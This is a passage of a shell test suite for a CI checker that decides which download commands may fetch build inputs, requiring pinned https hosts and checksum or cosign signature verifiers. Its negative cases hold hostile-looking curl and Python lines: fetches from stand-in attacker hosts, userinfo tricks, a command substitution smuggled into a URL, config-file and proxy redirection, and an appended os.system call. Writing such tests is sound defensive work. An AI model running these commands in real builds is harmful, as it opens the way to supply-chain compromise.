hostcase "$C --location $R $O $U" 0 'control (ruling 3): --location the same' "{\"redirects\": true, $SIGV}"
hostcase "curl -q -fsSL -g --proto =https --proto-redir =https $O $U" 1 'ruling 3a: a redirects row without --max-redirs is refused' "{\"redirects\": true, $SIGV}"
hostcase "curl -q -fsSL -g --proto =https --proto-redir =https --max-redirs 5 $O $U" 1 'ruling 3a: --max-redirs 5 (not exactly 3) is refused' "{\"redirects\": true, $SIGV}"
hostcase "curl -q -fsSL -g --proto =https --proto-redir =https --max-redirs 0 $O $U" 1 'ruling 3a: --max-redirs 0 (not exactly 3) is refused' "{\"redirects\": true, $SIGV}"
hostcase "curl -q -fsSL -g --proto =https --proto-redir =https --max-redirs \"\$n\" $O $U" 1 'ruling 3a: --max-redirs with a variable is refused' "{\"redirects\": true, $SIGV}"
hostcase "$C --max-redirs 3 $O $U" 1 'ruling 3a: --max-redirs on a line that does not follow redirects is refused'
hostcase "curl -q -fsSL -g --proto =https $R $O $U" 1 'ruling 3b: a redirects row whose verifier is checksum-only (sha256sum -c) is refused' '{"redirects": true}'
hostcase "$C $R $O $U" 1 'F11: redirects: true on a line that does not follow redirects is refused' "{\"redirects\": true, $SIGV}"
# ruling 3b/3c: the verifier of a redirects row is a SIGNATURE check: code holding cosign verify-blob with --certificate-identity[-regexp] and --certificate-oidc-issuer
sigcase() { # VERIFIER-FILE-TEXT VERIFIER-JSON EXPECTED-RC WHY [VERIFIER-PATH]
  ifrepo ifs "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$RLL"$'\n' head "${5:-bin/v2.sh}" "$1"
  ifx "$work/if-s.json" plain "$(ifrow bin/fetch.sh "$RLL" "$HOSTN" "{\"redirects\": true, \"verifier\": $2}")"; ifck ifs "$work/if-s.json"
  CASE="AC19 (redirects verifier, ruling 3b): $4: exit $3"
  check test "$rc" -eq "$3"; if [ "$3" -ne 0 ]; then check grep -qE 'input fetch not verified.*(signature|as code)' "$work/if.out"; fi
}
RLL="curl -q -fsSL -g --proto =https $R $O $U"
vj() { python3 -c 'import json,sys; print(json.dumps({"file": "bin/v2.sh", "line": sys.argv[1]}))' "$1"; }   # a line verifier as JSON
VF='{"file": "bin/v2.sh", "function": "vs"}'
CO='cosign verify-blob --bundle "$1.b" --certificate-identity "https://github.com/o/r/.github/workflows/r.yml@refs/heads/main" --certificate-oidc-issuer https://token.actions.githubusercontent.com "$1"'
sigcase $'#!/bin/sh\nvs() { '"$CO"$' || exit 1; }\n' "$VF" 0 'control: a one-line function running cosign verify-blob with the identity and issuer passes'
sigcase $'#!/bin/sh\nvs() {\n  if ! '"$CO"$'; then exit 1; fi\n}\n' "$VF" 0 'control: cosign verify-blob inside if ! ...; then exit 1; fi passes'
sigcase $'#!/bin/sh\nvs() {\n  '"${CO/--certificate-identity /--certificate-identity-regexp }"$' || exit 1\n}\n' "$VF" 0 'control: --certificate-identity-regexp passes'
sigcase $'#!/bin/sh\nvs() {\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'a checksum-only function (sha256sum -c) is refused'
sigcase $'#!/bin/sh\nvs() {\n  shasum -a 256 -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'a checksum-only function (shasum) is refused'
CONOID='cosign verify-blob --bundle "$1.b" --certificate-oidc-issuer https://token.actions.githubusercontent.com "$1"'; sigcase $'#!/bin/sh\nvs() {\n  '"$CONOID"$' || exit 1\n}\n' "$VF" 1 'cosign verify-blob without --certificate-identity is refused'
CONOISS='cosign verify-blob --bundle "$1.b" --certificate-identity "https://github.com/o/r/.github/workflows/r.yml@refs/heads/main" "$1"'; sigcase $'#!/bin/sh\nvs() {\n  '"$CONOISS"$' || exit 1\n}\n' "$VF" 1 'cosign verify-blob without --certificate-oidc-issuer is refused'
sigcase $'#!/bin/sh\nvs() {\n  # '"$CO"$'\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'verify-blob only in a comment is refused'
sigcase $'#!/bin/sh\nvs() {\n  cat >/dev/null <<EOF\n'"$CO"$'\nEOF\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'verify-blob only in a heredoc is refused'
sigcase $'#!/bin/sh\nvs() {\n  echo "'"${CO//\"/}"$'" >&2\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'verify-blob only in an echo string is refused'
sigcase $'#!/bin/sh\nvs() {\n  sha256sum -c "$1.sha256" || exit 1\n}\nother() {\n  '"$CO"$' || exit 1\n}\n' "$VF" 1 'verify-blob in ANOTHER function of the file is refused'
sigcase $'#!/bin/sh\n'"$CO"$' || exit 1\n' "$(vj "$CO || exit 1")" 0 'control: a verifier LINE that is the cosign verify-blob command passes'
COE="echo \"${CO//\"/}\""; sigcase $'#!/bin/sh\n'"$COE"$'\n' "$(vj "$COE")" 1 'a verifier LINE that only echoes the cosign command is refused'
sigcase $'#!/bin/sh\npython3 - <<\'PY\'\nimport subprocess\ndef vs(p):\n    if subprocess.run(["cosign", "verify-blob", "--bundle", p + ".b", "--certificate-identity", "https://github.com/o/r/.github/workflows/r.yml@refs/heads/main", "--certificate-oidc-issuer", "https://token.actions.githubusercontent.com", p]).returncode:\n        raise SystemExit(1)\nPY\n' "$VF" 0 'control: a Python def calling subprocess.run(["cosign", "verify-blob", ... identity, issuer ...]) passes'
sigcase $'#!/bin/sh\npython3 - <<\'PY\'\nimport subprocess\ndef vs(p):\n    print("cosign verify-blob --certificate-identity x --certificate-oidc-issuer y")\n    raise SystemExit(1)\nPY\n' "$VF" 1 'a Python def that only prints the cosign command is refused'
sigcase $'#!/bin/sh\npython3 - <<\'PY\'\nimport subprocess\ndef vs(p):\n    if subprocess.run(["echo", "--certificate-identity", "x", "--certificate-oidc-issuer", "y", p]).returncode:\n        raise SystemExit(1)\nPY\n' "$VF" 1 'a Python call holding the identity and issuer flags but not cosign verify-blob is refused'
sigcase $'#!/bin/sh\nvs() { sha256sum -c x || exit 1; }\n' '{"file": "bin/sig.sh", "function": "verify_sig"}' 0 'control: the signature verifier in another file than the fetch (bin/sig.sh) passes'
hostcase 'curl -q -fsS -g -o "$tmp/i" "https://$HOST/os/x86_64/APKINDEX.tar.gz"' 1 'a variable host (https://$HOST/) is refused'
hostcase 'curl -q -fsS -g -o "$tmp/i" "https://${HOST}/os/x86_64/APKINDEX.tar.gz"' 1 'a variable host (https://${HOST}/) is refused'
hostcase 'curl -q -fsS -g -o "$tmp/i" "$URL"' 1 'a URL that is wholly a variable ($URL) is refused'
hostcase 'curl -q -fsS -g -o "$tmp/k" "$WOLFI/wolfi-signing.rsa.pub"' 1 'a host-and-prefix variable ($WOLFI/...) is refused'
hostcase "$C $O \"http://packages.example.dev/os/i\"" 1 'plain http:// to the right host is refused'
hostcase "$C $O \"https://packages.example.dev.evil.example/os/i\"" 1 'a host that only starts with the ruled host is refused'
hostcase "$C $O \"https://packages.example.dev@evil.example/os/i\"" 1 'userinfo before another host is refused'
hostcase "$C $O \"https://packages.example.dev:8443/os/i\"" 1 'a port after the ruled host is refused'
hostcase "$C $O $U \"\$EVIL\"" 1 'a second URL from a variable on the same command is refused'
hostcase "$C $O $U https://evil.example/x" 1 'a second literal URL to another host is refused'
hostcase "$C --url \"\$EVIL\" $O $U" 1 '--url VALUE is refused'
hostcase "$C -K \"\$cfg\" $O $U" 1 '-K (a config file that can name any URL) is refused'
hostcase "curl -q -fsSK \"\$cfg\" -g --proto =https $O $U" 1 'K hidden in a short-option cluster is refused'
hostcase "$C --resolve packages.example.dev:443:10.0.0.1 $O $U" 1 '--resolve is refused'
hostcase "$C -x \"\$PROXY\" $O $U" 1 '-x (a proxy) is refused'
hostcase "https_proxy=\$P $C $O $U" 1 'an environment assignment before the command is refused'
hostcase "$C $O \"https://packages.example.dev/\$(cat /tmp/p)\"" 1 'a command substitution in the address is refused'
hostcase "$C $O \"https://packages.example.dev/os/i" 1 'an unbalanced quote is refused'
hostcase "$C $O \"HTTPS://packages.example.dev/os/i\"" 1 'an upper-case scheme is refused'
hostcase "curl -q -fsS -g --proto =all $O $U" 1 '--proto other than =https is refused'
hostcase "curl -q -fsS -g $O $U" 1 'proto: a ruled curl line WITHOUT --proto =https is refused'
hostcase "curl -q -fsS -g --proto =https,http $O $U" 1 'proto: --proto =https,http is refused'
hostcase "curl -q -fsS -g --proto +all $O $U" 1 'proto: --proto +all is refused'
hostcase "curl -q -fsS -g --proto-redir =https $O $U" 1 'proto: --proto-redir alone (no --proto =https) is refused'
hostcase "$C --max-time ٣ $O $U" 1 'a number in another script (Arabic-Indic digits) is refused'
hostcase "curl -q -fsSL -g --proto =https --proto-redir =https --max-redirs ٣ $O $U" 1 'ruling 3a: --max-redirs in Arabic-Indic digits is refused' "{\"redirects\": true, $SIGV}"
hostcase "$C --max-time x $O $U" 1 'a number option with no number is refused'
ifx "$work/if-hw.json" plain "$(ifrow bin/fetch.sh "$LIT" other.example.dev)" "$RKEY"; ifck ifm "$work/if-hw.json"
CASE="AC19 (host row): a host row naming another host than the line's does not apply: that fetch fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1
# --- the Python form (P3: a subprocess.run of curl inside a quoted python3 heredoc of a .sh file) ---------------------------------------------------------
PYF='    r = subprocess.run(["curl", "-q", "-fsS", "-g", "--max-filesize", "268435456", "--proto", "=https", "--tlsv1.2", "-o", part, "https://packages.example.dev/os/%s/%s-%s.apk" % (arch, name, ver)], stdout=sys.stderr, stderr=sys.stderr)'
PYDEF=$'def verify(path, e):\n    if hashlib.sha256(open(path, "rb").read()).hexdigest() != e:\n        raise SystemExit(1)\n'
PYOPEN='python3 - "$tmp" <<'"'PY'"' || exit $?'; PYV='{"verifier": {"file": "bin/fetch.sh", "function": "verify"}}'
pycase() { # PYTHON-LINE EXPECTED-RC WHY [HEREDOC-OPENER]
  local opener=${4:-$PYOPEN}
  ifrepo ifp "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$opener"$'\nimport hashlib, subprocess, sys\n'"$PYDEF"$'for part in []:\n'"$1"$'\nPY\n'
  ifx "$work/if-p.json" plain "$(ifrow bin/fetch.sh "$1" "$HOSTN" "$PYV")"; ifck ifp "$work/if-p.json"
  CASE="AC19 (Python form): $3: exit $2"
  check test "$rc" -eq "$2"; if [ "$2" -ne 0 ]; then check grep -q 'input fetch not verified' "$work/if.out"; fi
}
pycase "$PYF" 0 'control: subprocess.run(["curl", "-q", ...literal options..., "-o", NAME, "https://HOST/...%s..." % (NAMES)], stdout=sys.stderr, stderr=sys.stderr) passes, verified by a def in the python heredoc'
pycase "${PYF/r = /}" 0 'control: the same call without an assignment passes'
pycase "${PYF/\"-q\", /}" 1 'F2: the Python form without "-q" first is refused'
pycase "${PYF/\"-g\", /}" 1 'F3: the Python form without "-g" is refused'
pycase "${PYF/\"--proto\", \"=https\", /}" 1 'proto: the Python form without "--proto", "=https" is refused'
pycase "${PYF/\"=https\"/\"=https,http\"}" 1 'proto: the Python form with "--proto", "=https,http" is refused'
pycase "${PYF/https:\/\/packages.example.dev/https://%s}" 1 'a host from a % argument is refused'
pycase "${PYF/\"https:\/\/packages.example.dev\/os\/%s\/%s-%s.apk\" % (arch, name, ver)/e[\"url\"]}" 1 'an address read from a variable (e["url"]) is refused'
pycase "$(printf '%s' "$PYF" | sed 's/%s-%s.apk/%d-%s.apk/')" 1 'a format other than %s is refused'
CASE="AC19 (Python form): the %d variant really differs from the control line"
check test "$(printf '%s' "$PYF" | sed 's/%s-%s.apk/%d-%s.apk/')" != "$PYF"
pycase "${PYF/stdout=sys.stderr/shell=True}" 1 'shell=True (or any keyword but stdout/stderr=sys.stderr) is refused'
pycase "${PYF/stdout=sys.stderr/shell=False}" 1 'ruling 2: shell= with ANY value (shell=False) is refused'
pycase "${PYF/stderr=sys.stderr)/stderr=sys.stderr, check=True)}" 1 'ruling 2: another keyword (check=True) is refused'
pycase '    r = subprocess.run("curl -q -fsS -g -o x https://packages.example.dev/os/i", stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: a STRING command (not the list form) is refused'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", "-o", part, url], stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: the address as a variable (url) is refused'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", "-o", part, "https://" + host + "/os/i"], stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: a + concatenation producing the host is refused'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", "-o", part, "https://packages.example.dev/os/" + name], stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: a + concatenation in the path is refused (only % names)'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", *args, "https://packages.example.dev/os/i"], stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: *args in the list is refused'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", "-o", part, "https://packages.example.dev/os/i"], **kw)' 1 'ruling 2: **kwargs is refused'
pycase '    r = subprocess.run(["curl", "-q", "-fsS", "-g", "-o", part, f"https://packages.example.dev/os/{name}"], stdout=sys.stderr, stderr=sys.stderr)' 1 'ruling 2: an f-string address is refused (only % names)'
pycase "${PYF/\"=https\", /\"=https\", \"-K\", cfg, }" 1 'an option the check does not read (-K) is refused'
pycase "${PYF/\"-o\", part/\"-o\", \"/etc/x\"}" 1 'an absolute literal output path is refused'
pycase "$PYF; os.system(\"sh x\")" 1 'a second statement on the line is refused'
pycase "$(printf '%s' "$PYF" | sed 's/(arch, name, ver)\]/(arch, name, ver), extra[0]]/')" 1 'a list element that is not a literal word, a name or a formatted address (extra[0]) is refused'
pycase "$PYF" 1 'F10: the Python form in an UNQUOTED heredoc (the shell expands it) is refused' "python3 - \"\$tmp\" <<PY"
pycase "$PYF" 1 'F10: the Python form in a heredoc that is not python3 (data) is refused' "cat >/dev/null <<'PY'"
ifrepo ifpsh "${SUPPORT[@]}" head bin/fetch.sh "$FETCH${PYF#    }"$'\n'
ifx "$work/if-p.json" plain "$(ifrow bin/fetch.sh "$PYF" "$HOSTN")"; ifck ifpsh "$work/if-p.json"
CASE="AC19 (Python form, F10): the Python form in the shell text of a .sh (not in a python3 heredoc) is refused: exit 1"
check test "$rc" -eq 1
ifrepo ifshpy "${SUPPORT[@]}" head bin/fetch.sh "$FETCH"$'python3 - <<\'PY\'\n'"$LIT"$'\nPY\n'
ifck ifshpy "$work/if-one.json"
CASE="AC19 (F10): a shell-form fetch line inside a python3 heredoc is refused: exit 1"
check test "$rc" -eq 1
# --- F10: in a workflow or action, a ruled fetch line counts only inside a run: block (run by bash)
wfr() { printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n%s\n' "$1"; }
wfcase() { # STEPS-YAML EXPECTED-RC WHY
  ifrepo ifwf "${SUPPORT[@]}" head .github/workflows/f.yml "$(wfr "$1")"
  ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN")"; ifck ifwf "$work/if-wf.json"
  CASE="AC19 (workflow, F10): $3: exit $2"
  check test "$rc" -eq "$2"; if [ "$2" -ne 0 ]; then check grep -qE 'input fetch not verified|a download added' "$work/if.out"; fi
}
wfcase "      - run: |"$'\n'"          $LIT" 0 'control: the fetch line in a run: block passes'
wfcase "      - name: s"$'\n'"        with:"$'\n'"          script: |"$'\n'"            $LIT" 1 'the fetch line in a with: script: block is refused'
wfcase "      - run: |"$'\n'"          $LIT"$'\n'"      - name: s"$'\n'"        with:"$'\n'"          script: |"$'\n'"            $LIT" 1 'one copy in run: and one in with: script: is refused (every copy must be in a run: block)'
ifrepo ifwf "${SUPPORT[@]}" head .github/workflows/f.yml "$(wfr "      - run: |"$'\n'"          $LIT"$'\n'"      - name: s"$'\n'"        with:"$'\n'"          script: |"$'\n'"            $LIT")"
ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN" '{"count": 2}')"; ifck ifwf "$work/if-wf.json"
CASE="AC19 (workflow, F10): one copy in run: and one in with: script:, the row counting both, is refused (every copy must be in a run: block): exit 1"
check test "$rc" -eq 1; check grep -q 'every copy of the line' "$work/if.out"
wfcase "      - shell: python"$'\n'"        run: |"$'\n'"          $LIT" 1 'a run: block with shell: python is refused'
# --- the verifier and the test (F8): in the head, defined as code with a non-empty body, the case present
vtcase() { # OVERRIDES-JSON WHY [REPO]
  ifx "$work/if-vt.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$1")" "$RKEY"; ifck "${3:-ifm}" "$work/if-vt.json"
  CASE="AC19 (verifier/test): $2: that fetch fails (exit 1), named, the other stays ruled"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; check grep -qE 'input fetch not verified.*(verifier|test)' "$work/if.out"
}
vtcase '{"verifier": {"file": "bin/missing.sh", "function": "verify_sha256"}}' 'a verifier file not in the head tree'
vtcase '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sig"}}' 'a verifier function the file does not define'
vtcase '{"verifier": {"file": "bin/fetch-test.sh", "function": "verify_sha256"}}' 'a file that only MENTIONS the function (no definition)'
vtcase '{"verifier": {"file": "bin/fetch.sh", "line": "sha256sum -c - || exit 1"}}' 'a verifier line the file does not hold'
vtcase '{"test": {"file": "bin/missing-test.sh", "case": "a package whose bytes fail verify_sha256 is removed before use"}}' 'a test file not in the head tree'
vtcase '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes fail is used anyway"}}' 'a test case the test file does not hold'
ifrepo iflink "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n'
lb=$(printf 'verify_sha256() { sha256sum -c "$1" || exit 1; }' | git -C "$work/iflink" hash-object -w --stdin)   # a symbolic link in the TREE whose target text defines the function
git -C "$work/iflink" update-index --add --cacheinfo "120000,$lb,bin/vlink.sh"; git -C "$work/iflink" commit -q --amend -m head
vtcase '{"verifier": {"file": "bin/vlink.sh", "function": "verify_sha256"}}' 'a verifier that is a symbolic link in the tree' iflink
vdef() { # VERIFIER-FILE-TEXT WHY [FUNCTION]
  ifrepo ifv "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n' head bin/verify.sh "$1"
  vtcase "{\"verifier\": {\"file\": \"bin/verify.sh\", \"function\": \"${3:-vfy}\"}}" "F8: $2" ifv
}
vdef $'#!/bin/sh\nvfy() { :; }\n' 'a shell function whose body is only :'
vdef $'#!/bin/sh\nvfy() { true; }\n' 'a shell function whose body is only true'
vdef $'#!/bin/sh\nvfy() {\n}\n' 'a shell function with an empty body'
vdef $'#!/bin/sh\ncat >/dev/null <<EOF\nvfy() { sha256sum -c x || exit 1; }\nEOF\n' 'a shell function defined only inside a heredoc (data)'
vdef $'#!/bin/sh\ncat >/dev/null <<\'PY\'\ndef vfy(p):\n    raise SystemExit(1)\nPY\n' 'a Python def inside a heredoc that is not python3 (data)'
vdef $'#!/bin/sh\npython3 - <<\'PY\'\ndef vfy(p):\n    pass\nPY\n' 'a Python def whose body is only pass'
vdef $'#!/bin/sh\npython3 - <<\'PY\'\n  def vfy(p):\n      raise SystemExit(1)\nPY\n' 'a Python def not at column 0'
vdef $'#!/bin/sh\n# vfy() { sha256sum -c x || exit 1; }\n' 'a definition in a comment'
vdef $'#!/bin/sh\npython3 - <<\'PY\'\nvfy() { sha256sum -c x || exit 1; }\nPY\n' 'a shell function written only inside a python3 heredoc body'
vdef $'#!/bin/sh\ndef vfy(p):\n    raise SystemExit(1)\n' 'a Python def in the shell text of a .sh file (not in a python3 heredoc)'
ifrepo ifv "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n' head bin/verify.sh $'#!/bin/sh\ncat >/dev/null <<EOF\nsha256sum -c x || exit 1\nEOF\n'
vtcase '{"verifier": {"file": "bin/verify.sh", "line": "sha256sum -c x || exit 1"}}' 'F8: a verifier LINE found only inside a data heredoc' ifv
ifrepo ifvok "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n' head bin/verify.sh $'#!/bin/sh\nvfy() {\n  sha256sum -c "$1" || exit 1\n}\npython3 - <<\'PY\'\ndef pvfy(p):\n    raise SystemExit(1)\nPY\n'
for fn in vfy pvfy; do
  ifx "$work/if-vt.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "{\"verifier\": {\"file\": \"bin/verify.sh\", \"function\": \"$fn\"}}")" "$RKEY"; ifck ifvok "$work/if-vt.json"
  CASE="AC19 (verifier/test, F8) control: $fn defined as code with a real body passes (exit 0)"
  check test "$rc" -eq 0
done
ifx "$work/if-vl.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" '{"verifier": {"file": "bin/fetch.sh", "line": "verify_sha256() { echo \"$2  $1\" | sha256sum -c - >/dev/null || { rm -f \"$1\"; exit 1; }; }"}}')" "$RKEY"; ifck ifm "$work/if-vl.json"
CASE="AC19 (verifier/test) control: a verifier named by its exact line passes (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 2
ifrepo ifgone "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head bin/fetch.sh $'#!/bin/sh\nset -eu\n'"$LIT"$'\n'
ifck ifgone "$work/if-ok.json"
CASE="AC19 (verifier/test): a pull request that removes the verifier of a ruled fetch still in the head fails (exit 1), naming the verifier"
check test "$rc" -eq 1; check grep -q 'verify_sha256' "$work/if.out"
ifrepo ifgonet "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head bin/fetch-test.sh $'#!/bin/sh\n'
ifck ifgonet "$work/if-ok.json"
CASE="AC19 (verifier/test): a pull request that removes the test case of a ruled fetch still in the head fails (exit 1)"
check test "$rc" -eq 1
ifrepo ifstay "${SUPPORT[@]}" base bin/fetch.sh "$FETCH$LIT"$'\n' head README.md 'x'
ifck ifstay "$work/if-ok.json"
CASE="AC19 (verifier/test) control: a pull request that keeps the verifier and the test of a ruled fetch passes (exit 0)"
check test "$rc" -eq 0
# (1) a malformed unmeasured_input_fetch stops the check (exit 2), never "nothing ruled" and never "everything ruled"
for ov in '{"host": null}' '{"verifier": null}' '{"test": null}' '{"ruling": ""}' '{"ruling": " "}' '{"key": "ABCDEF0123456789"}' '{"key": "0123"}' '{"line": 7}' \
  '{"count": 0}' '{"count": 101}' '{"count": true}' '{"count": 2.0}' '{"note": "x"}' '{"form": "a system package install"}' '{"file": ""}' \
  '{"host": ""}' '{"host": "Packages.Example.Dev"}' '{"host": "https://packages.example.dev"}' '{"host": "packages.example.dev/os"}' '{"host": "packages.example.dev:443"}' \
  '{"host": "localhost"}' '{"host": "lock:build/locks/pkgs.lock"}' '{"host": "lock:"}' '{"host": 5}' '{"redirects": false}' '{"redirects": "yes"}' '{"redirects": 1}' \
  '{"verifier": "bin/fetch.sh"}' '{"verifier": {"file": "bin/fetch.sh"}}' '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sha256", "line": "x y z"}}' \
  '{"verifier": {"file": "bin/fetch.sh", "function": "verify sha"}}' '{"verifier": {"file": "/bin/fetch.sh", "function": "verify_sha256"}}' \
  '{"verifier": {"file": "bin/fetch.sh", "function": "verify_sha256", "note": "x"}}' '{"verifier": {"file": "bin/fetch.sh", "line": ""}}' \
  '{"verifier": {"file": "bin/fetch.sh", "line": "a\nb"}}' '{"verifier": {"file": "../fetch.sh", "function": "verify_sha256"}}' \
  '{"verifier": {"file": "bin/fetch.yml", "function": "verify_sha256"}}' \
  '{"test": "bin/fetch-test.sh"}' '{"test": {"file": "bin/fetch-test.sh"}}' '{"test": {"file": "bin/fetch-test.sh", "case": "short"}}' \
  '{"test": {"file": "bin/fetch.sh", "case": "a package whose bytes fail verify_sha256 is removed before use"}}' \
  '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes fail verify_sha256 is removed before use", "note": "x"}}' \
  '{"test": {"file": "bin/fetch-test.sh", "case": "a package whose bytes\nfail verify_sha256"}}'; do
  ifx "$work/if-bad.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" "$ov")" "$RKEY"; ifck ifm "$work/if-bad.json"
  CASE="AC19: a malformed unmeasured_input_fetch row ($ov) stops the check fail-closed: exit 2, names the list, never a pass"
  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
done
for m in notlist notdict dup dupjsonkey duprowkey nanrow; do
  ifx "$work/if-bad.json" "$m" "$RLIT" "$RKEY"; ifck ifm "$work/if-bad.json"
  CASE="AC19: a malformed unmeasured_input_fetch ($m) stops the check fail-closed: exit 2, names the list, never a pass"
  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"; check grep -qi 'not a pass' "$work/if.out"
done
CASE="AC19 (generic): no row without host, verifier and test is accepted: an AC16 row, and the AC19 row less any one field or sub-field, are each refused by the loader"
check python3 - "$chk" "$work" "$RLIT" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
good = json.loads(sys.argv[3]); p = sys.argv[2] + "/if-gen.json"
def load(row):
    json.dump({"exceptions": [], "unmeasured_input_fetch": [row]}, open(p, "w"))
    return ac.load_input_fetch(p, required=True)
assert len(load(good)) == 1
variants = [{k: good[k] for k in ("file", "form", "key", "line", "ruling")}]
variants += [{k: v for k, v in good.items() if k != drop} for drop in good]
variants += [dict(good, **{f: {k: v for k, v in good[f].items() if k != drop}}) for f in ("verifier", "test") for drop in good[f]]
for v in variants:
    try:
        load(v)
    except RuntimeError as e:
        assert "unmeasured_input_fetch" in str(e), e
    else:
        raise AssertionError(("accepted", v))
PY
# --- AC19 amendment (advisor, Oct 10 step 5): the authenticated draft download, host repo:self. The line is EXACTLY
# gh release download "$ver" --repo "$GITHUB_REPOSITORY" with one or more -p NAME (a literal exact asset name, or one in double quotes whose only
# expansion is ${ver}) and at most one -D PATH (/tmp/<name> or a relative name), on one physical line; the line IMMEDIATELY before it checks $ver
# against the release tag pattern and exits on a mismatch; every line of the step before the check is one of a CLOSED list (F6): blank, a comment,
# set -eu / set -euo pipefail, ver="$NAME", mkdir [-p] <literal path>. A workflow step runs in bash (no shell:, no BASH_ENV or ENV in any env:).
GHD='gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -p checksums.txt -D dist/draft'
CHK='[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]] || exit 1'
PRE=$'#!/bin/bash\nset -euo pipefail\nver="$VER"\n'
ghcase() { # STEP-TEXT-BEFORE DOWNLOAD-LINE EXPECTED-RC WHY [PREAMBLE]: bin/rel.sh = PREAMBLE, STEP-TEXT-BEFORE, the download line
  ifrepo ifg "${SUPPORT[@]}" head bin/rel.sh "${5-$PRE}$1$2"$'\n'
  ifx "$work/if-g.json" plain "$(ifrow bin/rel.sh "$2" repo:self)"; ifck ifg "$work/if-g.json"
  CASE="AC19 (repo:self): $4: exit $3"
  check test "$rc" -eq "$3"
  if [ "$3" -eq 0 ]; then check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 1; else check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; check grep -q 'input fetch not verified' "$work/if.out"; fi
}
ghcase "$CHK"$'\n' "$GHD" 0 'control: the tag check on the line before, two literal -p names and a literal -D pass'
ghcase $'mkdir -p dist/draft\n# fetch the draft\n\n'"$CHK"$'\n' "$GHD" 0 'control: mkdir -p LITERAL, a comment and a blank line before the check pass'
ghcase '[[ $ver =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo "not a release tag" >&2; exit 2; }'$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json' 0 'control: the { echo MSG >&2; exit N; } form, the plain-release pattern and one -p pass'
ghcase 'if [[ ! "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]]; then echo "bad tag" >&2; exit 1; fi'$'\n' "$GHD" 0 'control: the if [[ ! ... ]]; then ... exit N; fi form passes'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo other/repo -p manifest.json' 1 'a literal repository (--repo other/repo) is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$X" -p manifest.json' 1 'another repository variable (--repo "$X") is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" --repo other/repo -p manifest.json' 1 'a second --repo is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo="$GITHUB_REPOSITORY" -p manifest.json' 1 '--repo=VALUE (not the exact form) is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" -p manifest.json' 1 'no --repo is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p '"'*.json'" 1 "a glob in -p ('*.json') is refused"
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.{json,sig}' 1 'a brace in -p is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "$asset"' 1 'a variable in -p is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"' 1 'a missing -p is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" --archive tar.gz' 1 '--archive is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json --clobber' 1 'an extra flag (--clobber) is refused'
